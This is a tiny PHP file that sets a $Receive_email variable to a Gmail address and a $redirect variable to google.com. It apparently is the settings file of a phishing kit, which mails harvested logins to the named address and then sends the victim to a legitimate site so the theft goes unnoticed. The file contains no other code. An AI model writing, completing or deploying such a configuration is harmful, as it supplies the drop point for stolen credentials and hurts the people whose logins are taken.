<?php 
$Receive_email="khaleeworkspacembaku@gmail.com";
$redirect="https://www.google.com/";
?>